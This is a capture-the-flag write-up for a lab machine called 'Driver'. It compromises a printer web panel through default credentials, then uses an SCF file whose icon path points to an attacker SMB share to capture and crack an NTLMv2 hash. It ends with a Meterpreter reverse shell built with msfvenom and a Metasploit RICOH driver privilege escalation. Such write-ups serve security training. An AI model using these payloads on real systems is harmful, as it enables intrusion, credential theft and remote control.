# Driver

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.238
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 09:26 EDT
Nmap scan report for 10.129.95.238
Host is up (0.015s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

Interestingly, WinRM is open.&#x20;

### SCF Exploit -> Creds

Port 80 requires credentials to access.

<figure><img src="../../../.gitbook/assets/image (1064).png" alt=""><figcaption></figcaption></figure>

I tested weak credentials of `admin:admin`, and it worked. The page is some type of printer service panel.

<figure><img src="../../../.gitbook/assets/image (3003).png" alt=""><figcaption></figcaption></figure>

The only working part is the Firmware Updates, which redirects us to this page:

<figure><img src="../../../.gitbook/assets/image (3892).png" alt=""><figcaption></figcaption></figure>

This would take any file and upload them to the file share, and a user would open it. Because it uploads to SMB, we can create a malicious SCF File to exploit this.

{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}

This uses the SCF file to access our machine via SMB, and `responder` would capture the hash. Create an SCF file like so and start `responder`.&#x20;

```
[Shell]
Command=2
IconFile=\\10.10.14.13\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Once uploaded, `responder` would capture a hash:

<figure><img src="../../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

This can be cracked easily:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2023-05-06 09:34) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We can then log in using `evil-winrm` since port 5985 is open.

<figure><img src="../../../.gitbook/assets/image (787).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Printer Driver Exploit

I ran a WinPEAS scan to enumerate for me. While reading the output, we can see that there's Powershell history files:

<figure><img src="../../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

Here's the file content:

```
*Evil-WinRM* PS C:\Users\tony\Documents> type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

This, combined with the box name was a hint that we had to expoloit this specific driver somehow. I could only find Metasploit exploits, so let's use that. First we have to generate a Meterpreter reverse shell.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f exe -o meter.exe
```

Then, we need to upload it and start `exploit/multi/handler`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2321).png" alt=""><figcaption></figcaption></figure>

Then, we need to first run `migrate -N explorer.exe` , then `background` this and use the `exploit/windows/local/ricoh_driver_privesc` module. Then, run the following:

```
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 5555
exploit
```

Afterwards, we would get a shell as the SYSTEM user.

<figure><img src="../../../.gitbook/assets/image (2684).png" alt=""><figcaption></figcaption></figure>

Rooted!
